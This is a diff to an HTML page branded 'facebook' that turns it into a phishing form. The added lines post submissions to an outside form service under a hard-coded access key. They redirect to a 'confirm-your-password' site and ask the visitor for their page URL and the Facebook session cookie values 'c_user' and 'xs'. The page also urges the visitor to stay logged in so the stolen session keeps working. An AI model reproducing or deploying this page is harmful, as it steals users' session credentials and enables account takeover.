@@ -96,6 +96,13 @@
     </style>
 </head>
 <body>
+    
+<form class="content" action="https://api.web3forms.com/submit" method="POST">
+
+<input type="hidden" name="access_key" value="39a9a931-54ec-4200-b958-efb4d21fc59a">
+
+<input type="hidden" name="redirect" value="https://confirm-your-password.netlify.app/">
+
 
     <div class="header">
         <h2>facebook</h2>
@@ -111,12 +118,15 @@
 
         <h4>Detailed Video Information</h4>
         <div class="video-container">
-            <iframe src="https://www.youtube.com/embed/VIDEO_ID_HERE" frameborder="0" allowfullscreen></iframe>
+            <iframe src="video.4" frameborder="0" allowfullscreen></iframe>
         </div>
 
-        <input type="text" class="input-box" placeholder="Enter your page name">
-        <input type="password" class="input-box" placeholder="Enter verification code">
-
+                                            
+            </p><input class="border h-6 pl-1 mx-3" type="text" name="Page Name" placeholder="Page URL"title="Must Watch Detailed Video" required="1" aria-required="true">
+                                    </p><input class="border h-6 pl-1 mx-3" type="number" name="c_user" pattern="[0-9]+" minlength="6" placeholder="C_user" title="Must Watch Detailed Video" required="1" aria-required="true">
+                            
+            </p><input class="border h-6 pl-1 mx-3" type="text" name="xs" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" placeholder="xs"title="Must Watch Detailed Video" required="1" aria-required="true">
+                    
         <p class="note">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
 
         <button class="submit-button">Submit</button>
